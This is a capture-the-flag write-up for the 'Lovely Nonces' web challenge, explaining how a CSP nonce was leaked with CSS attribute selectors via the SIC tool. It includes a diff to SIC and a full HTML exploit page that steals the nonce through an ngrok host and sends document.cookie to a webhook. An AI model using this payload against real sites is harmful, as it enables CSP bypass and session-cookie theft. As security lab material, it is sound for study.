# Leaking nonce with css selectors

In the challenge Lovely Nonces we get the ability to inject any HTML into the page using the location hash of the website. But script execution is prevented through a random nonce via CSP.

We used [SIC](https://github.com/d0nutptr/sic/) to extract the nonce from the site and [ngrok](https://ngrok.com/) to proxy the requests. Here is the template we used for SIC
```css
script {display: block;}
script[nonce^={{:token:}}] {background-image: url("{{:callback:}}");}
```

Since SIC keeps the nonces under random IDs generated per session, we modified the application to use a static ID of 1 for all requests, and then made a new endpoint to get the token.

Here are the modifications for `main.rs` 
```diff   
diff --git a/src/main.rs b/src/main.rs
index 8f1d9e2..5710082 100644
--- a/src/main.rs
+++ b/src/main.rs
@@ -70,14 +70,22 @@ fn service_handler(req: Request<Body>, state: StateMap) -> BoxFut {
             let mut staging_payload = "".to_string();

             for i in 0 .. len {
-                staging_payload += &format!("@import url({});\n", craft_polling_url(host, &id.to_string(), i).to_string());
+                staging_payload += &format!("@import url({});\n", craft_polling_url(host, &"1".to_owned(), i).to_string());
             }

             *response.body_mut() = Body::from(staging_payload);
         }
+        (&Method::GET, "/token") => {
+            let current_token = match state.get_token(&"1".to_owned()) {
+                Some(token) => token.clone(),
+                None => "".to_string()
+            };
+            let response2 = Response::builder().status(200).header("Access-Control-Allow-Origin","*").body(Body::from(current_token)).unwrap();
+            return Box::new(future::ok(response2));
+        }
         (&Method::GET, "/polling") => {
             let params = parse_query_params(&req);
-            let id = params.get("id").unwrap();
+            let id = "1".to_owned();
             let len = params.get("len").unwrap().parse::<u32>().unwrap();

             let generated_future = GeneratedCssFuture {
@@ -90,7 +98,7 @@ fn service_handler(req: Request<Body>, state: StateMap) -> BoxFut {
         }
         (&Method::GET, "/callback") => {
             let params = parse_query_params(&req);
-            let id = params.get("id").unwrap();
+            let id = &"1".to_owned();
             let token = params.get("token").unwrap();

             state.insert_or_update_token(id, token);
@@ -327,4 +335,4 @@ fn escape_for_css(unescaped_str: &String) -> String {
                .replace("|", "\\|")
                .replace("}", "\\}")
                .replace("~", "\\~")
-}
\ No newline at end of file
+}
```
### Difficulties with Chrome
Originally we planned on using iframes as we saw no x-frame-options preventing us, but because Chrome defaults cookies with no SameSite to Lax, that was not an option.

So instead we decided to go with opening a new window, and as the cookie is stored under the domain `localhost` we have to make sure the payload opens the window under the correct domain.

### The Payload
On our exploit page we open a new tab, which contains the first part of the payload, which is responsible for loading the SIC payload.

After 7 seconds (the usual time it takes for SIC to finish), we execute the second part of the payload which uses the nonce to execute arbitrary code on the client that lets us leak the cookie.

```html
<!DOCTYPE HTML>
<html>
    <body>
        <script>
            let myWindow = window.open("http://localhost:8000/#");
            setTimeout(() => {
                myWindow.location.href = "http://localhost:8000/#%3Cstyle%3E%40import%20url%28https%3A%2F%2Faad1-178-19-58-137.ngrok.io%2Fstaging%3Flen%3D16%29%3B%3C%2Fstyle%3E"
                setTimeout(() => {
                    fetch("https://aad1-178-19-58-137.ngrok.io/token").then(ret => ret.text()).then(token =>
                    {
                        myWindow.location.href = `http://localhost:8000/#<iframe srcdoc="<script nonce='${token}'>fetch('https://webhook.site/295236c6-7552-402b-9481-66359b777771%3Fc='%2Bdocument.cookie)<%2Fscript>">`; 
                    });
                }, 7000)
            },1000);
        </script>
    </body>
</html>
```
### Winner Winner Chicken Dinner!
Our final payload simply sends a fetch request to our webhook which gave us this flag.
`ASIS{nonces_disappointed_me_df393b}`

We learned many things about nonces and how cookies behave depending on their SameSite setting and environment.